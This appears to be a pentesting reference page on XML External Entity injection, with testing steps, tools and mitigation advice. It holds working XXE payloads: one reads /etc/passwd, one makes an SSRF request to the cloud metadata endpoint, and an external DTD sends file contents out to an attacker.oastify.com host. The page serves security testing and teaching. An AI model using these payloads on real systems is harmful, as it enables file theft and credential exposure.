# What is XXE?

XML External Entity (XXE) injection abuses an XML parser that resolves external entities. If the parser is configured to fetch external DTDs or entities, an attacker can read local files, reach internal services (SSRF), or in some setups get code execution. Anywhere an app accepts XML - SOAP, SAML, SVG, DOCX, RSS - is worth testing.

## How it works

- XML supports entities, including ones that pull content from a URI
- A parser with `resolve-external-entities` enabled fetches that URI
- Point the entity at `file://`, `http://`, or a php filter to exfiltrate data

## Test payloads

```xml
<!-- Read a local file -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

<!-- SSRF to internal metadata -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

<!-- Blind / out-of-band exfil via external DTD -->
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://attacker.oastify.com/evil.dtd"> %ext; ]>
```

```xml
<!-- evil.dtd hosted on your server -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - Repeater plus Collaborator for blind XXE
- [XXEinjector](https://github.com/enjoiz/XXEinjector) - automates file retrieval and OOB
- [interactsh](https://github.com/projectdiscovery/interactsh) - OAST callbacks

## Manual testing

1. Find any endpoint that accepts XML (check `Content-Type: application/xml`)
2. Define an entity that reads `/etc/passwd` and reference it in a reflected field
3. If nothing reflects, use an external DTD with an OAST callback for blind XXE
4. Try `php://filter/convert.base64-encode/resource=` to grab source safely

## Mitigation

- Disable DTDs and external entity resolution in the parser (the real fix)
- Prefer JSON or a hardened XML library with secure defaults
- Do not reflect parsed XML back to the user
- Patch SAML/SOAP stacks, which are common XXE hiding spots

## Deep dive

- [XXE - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger XXE labs](https://portswigger.net/web-security/xxe)

## CWE

- CWE-611: Improper Restriction of XML External Entity Reference
